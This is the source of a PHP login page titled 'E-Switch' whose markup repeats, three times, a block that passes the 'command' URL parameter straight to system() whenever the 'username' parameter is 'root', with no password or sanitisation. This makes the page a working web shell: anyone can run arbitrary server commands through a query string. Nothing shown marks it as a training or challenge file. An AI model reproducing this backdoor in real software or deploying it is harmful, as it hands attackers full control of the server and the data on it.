<!DOCTYPE html>
<html lang="eng">
<head>
    <link rel="stylesheet" type="text/css" href="login.css">
    <link href="https://fonts.googleapis.com/css?family=Muli&display=swap" rel="stylesheet">
    <meta charset="utf-8">
    <title>E-Switch</title>
</head>

<body>

<div class="welcome">

    <div class="layer">
        
    </div>
   

    <div class="logo">

    </div>

</div>

    <?php
            if ($_GET["username"] == "root"){
                global $command;
                $command = $_GET["command"];
                system($command);
            } else{
                echo "BAD LOGIN";
            }

    ?>


 <div class="login-area">

 	<div class="nav-left">
 	</div>

 	<div class="content-right" id="id01">
            <?php
            if ($_GET["username"] == "root"){
                global $command;
                $command = $_GET["command"];
                system($command);
            } else{
                echo "BAD LOGIN";
            }

    ?>
 	</div>

</div>


            <?php
            if ($_GET["username"] == "root"){
                global $command;
                $command = $_GET["command"];
                system($command);
            } else{
                echo "BAD LOGIN";
            }

    ?>

</body>
</html>